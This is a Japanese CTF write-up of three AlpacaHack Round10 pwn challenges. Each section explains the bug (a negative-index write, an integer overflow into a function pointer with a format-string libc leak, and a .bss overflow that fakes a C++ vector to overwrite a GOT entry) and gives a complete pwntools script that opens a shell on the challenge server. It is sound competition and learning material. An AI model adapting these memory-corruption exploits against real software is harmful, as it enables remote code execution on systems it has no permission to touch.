# AlpacaHack Round10 Jp
<primary-label ref="pwn"/>

English: [](AlpacaHack-Round10.md)

## Preface
私は[AlpacaHack Round10 (Pwn)](https://alpacahack.com/ctfs/round-10)に参加しました.
AlpacaHackはいつも刺激的な問題を提供し,過去の問題にも挑戦ができるプラットフォームです.

Round10では3問がユーザーランド,1問がカーネルでした.カーネルは解けなかったのでまた今度挑戦します.

![Screenshot_20250323_171502.png](Screenshot_20250323_171502.png)

## Oyster
<secondary-label ref="user"/>
<secondary-label ref="rce"/>

L26の操作は一見文字列の最後にヌル文字を入れているように見えますが`buf[0]`が`\0`であればマイナスインデクスのoobが発生します.
```c
  buf[strlen(buf)-1] = '\0';
```

![Screenshot_20250323_164627.png](Screenshot_20250323_164627.png)

password入力の際の`buf[-1]`には`cred.err`があるため`buf`がヌル文字単体である場合に`buf[strlen(buf)-1] = '\0';`によって`cred.err`が満たされます.

```py
from pwn import *
import sys

e = ELF("oyster",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 44367"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

sl  = lambda b: io.sendline(b)
shell = lambda : io.interactive()

sl(b"root")
sl(b"\0")

shell()
```


## Kangaroo
<secondary-label ref="user"/>
<secondary-label ref="rce"/>

自明なInteger Overflowがあります.計算したところ
```Py
-256204778801521543
```
のインデックスでoffsetが520になりました.よって`g_message`後方の関数ポインタが書き換えられます.

win関数は与えられていないためlibc leakをしなければシェルは取れません.
関数ポインタを`printf@plt`に書き換えformat string bugを引き起こしlibc leakしました.

libc leakからsystemのアドレスを関数ポインタに入れ,`g_messages`に`/bin/sh\0`を入れてから関数ポインタを呼び出しシェルを取りました :happy:

```py
from pwn import *
import sys

e = ELF("kangaroo_patched",checksec=False)
libc = ELF("libc.so.6",checksec=False)
ld = ELF("ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 54223"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    set max-visualize-chunk-size 0x300
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data


idx = -256204778801521543

print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(0).encode())
print(ru(b"Message: "))
sl("%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx,%lx")

print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(7).encode())
print(ru(b"Message: "))
s(b"A"*0x48)


paybyte(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
add64(e.plt["printf"])
print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(idx).encode())
print(ru(b"Message: "))
sl(payload)

leakidx = 8
diff = 0x2a1ca

print(ru(b"> "))
sl(b"3")
res = r()
leak = res.split(b",")[leakidx]
leak = int(leak,16)
libc.address = leak - diff
hlog(libc.address)


paybyte(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
add64(libc.sym["system"])

sl(b"1")
print(ru(b"Index: "))
sl(str(0).encode())
print(ru(b"Message: "))
sl(b"/bin/sh\x00")


print(ru(b"> "))
sl(b"1")
print(ru(b"Index: "))
sl(str(idx).encode())
print(ru(b"Message: "))
sl(payload)

sl(b"3")


shell()
```

## Takahashi
<secondary-label ref="user"/>
<secondary-label ref="rce"/>
<secondary-label ref="aarw"/>

Takahashiは誰ですか?
この問題はAtcorderのソルバを題材にした問題のようです.

```CPP
int Q;
int QueryType[100009], x[100009];
priority_queue<int, vector<int>, greater<int>> T;
int main() {
	cin >> Q;
	for (int i = 1; i <= Q; i++) {
		cin >> QueryType[i];
		if (QueryType[i] == 1) cin >> x[i];
	}
	for (int i = 1; i <= Q; i++) {
		if (QueryType[i] == 1) T.push(x[i]);
		if (QueryType[i] == 2) cout << T.top() << endl;
		if (QueryType[i] == 3) T.pop();
	}
	return 0;
}
void win() { std::system("/bin/sh"); } // Gift :)
```

自明なoobがあり`.bss`領域でのoverflowが発生します.また,intのvector配列もグローバルに宣言されておりこちらも`.bss`に存在します.

待ってください,私達はDown Under CTF 2024のVector Overflowを思い出しました.この問題は私も[writeup:DUCTF Vector Overflow](helloWorld.md)を書きました
```CPP
typename _Tp_alloc_type::pointer _M_start;
typename _Tp_alloc_type::pointer _M_finish;
typename _Tp_alloc_type::pointer _M_end_of_storage;
```
C++においてVector型はこのように確保されます.データの実態はヒープ領域に確保されますがoobによって要素を書き換えることができればAAR/Wプリミティブを作成できます.

`Partial RELRO`であることからGot overwriteができそうです.Win関数が提供されているためアドレス解決されていなかった`memmove@got`をwinアドレスに書き換えシェルを取りました.

`_M_end_of_storage`が枯渇するとvectorは新しい領域を今の領域の2倍のサイズでアロケートして`memmove`します.
`memmove@got`に4バイト書き込むのに十分なvector構造体を偽装しました.

```py
from pwn import *
import sys

e = ELF("a.out",checksec=False)
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
ld = ELF("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",checksec=False)

nc = "nc 34.170.146.252 55287"
HOST = nc.split(" ")[1]
PORT = int(nc.split(" ")[2])

dbg = 1
g_script = """
    #set max-visualize-chunk-size 0x300
    b *0x000000000040138d
    b *0x0000000000401426
"""

context.binary = e
if len(sys.argv) > 1:
    io = remote(host=HOST,port=PORT)
else:
    io = e.process()
    if dbg:
        gdb.attach(io,g_script)

s   = lambda b: io.send(b)
sa  = lambda a,b: io.sendafter(a,b)
sl  = lambda b: io.sendline(b)
sla = lambda a,b: io.sendlineafter(a,b)
r   = lambda : io.recv()
ru  = lambda b:io.recvuntil(b)
rl  = lambda : io.recvline()
pu32= lambda b : u32(b.ljust(4,b"\0"))
pu64= lambda b : u64(b.ljust(8,b"\0"))
hlog= lambda i : print(f"[*]{hex(i)}")
shell = lambda : io.interactive()
payload = b""
def pay64(adr:int):global payload;payload = p64(adr)
def add64(adr:int):global payload;payload+= p64(adr)
def paybyte(data:bytes):global payload;payload = data
def addbyte(data:bytes):global payload;payload+= data

qt_sz = 100009

tmp = input("go??????????????????????????")
sl(str(100022).encode())

tmp = input("go??????????????????????????")
"""
gef> x/4gx 0x04c8860
0x4c8860 <T>:   0x00000000004db6c0      0x00000000004db6cc
0x4c8870 <T+16>:        0x00000000004db6d0      0x0000000000000000
"""
win = 0x0401427
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
sl(b"4")
sleep(0.1)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"1\n0".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
paybyte(f"1\n4199463".encode())
sl(payload)
paybyte(f"4".encode())
sl(payload)
for i in range(qt_sz-3-8):
    #paybyte(f"1\n4199463".encode())
    paybyte(f"4\n".encode())
    sl(payload)

for i in range(100022-qt_sz-7-4):
    paybyte(f"1\n4660".encode())
    sl(payload)


vec_new = 0x00405050
sl(f"1\n{str(vec_new-8)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(vec_new)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(vec_new+16)}".encode())
sl(f"1\n{str(0)}".encode())
sl(f"1\n{str(0)}".encode())

shell()

```
